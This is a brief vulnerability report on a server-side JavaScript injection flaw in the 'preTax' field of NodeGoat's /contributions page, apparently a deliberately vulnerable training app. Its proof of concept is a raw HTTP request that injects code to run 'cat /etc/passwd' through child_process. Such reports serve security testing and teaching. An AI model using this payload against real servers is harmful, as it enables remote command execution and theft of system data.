Vulnerability.Name: Code Injection in /contributions
Vulnerability.Description: Server-side JavaScript code injection vulnerability exists due to insufficient filtration of user-supplied data passed via the "preTax" HTTP POST parameter to "http://owasp-nodegoat.com:4000/contributions" URL. A remote authenticated attacker (note, registration is open) can send a specially crafted HTTP POST request and execute arbitrary JavaScript code in the security context of the Node.js server.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/contributions HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/contributions Content-Type: application/x-www-form-urlencoded Content-Length: 90 Connection: close Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1Ejq4AVo4Eii51cYfCCr1L1g Upgrade-Insecure-Requests: 1
preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0
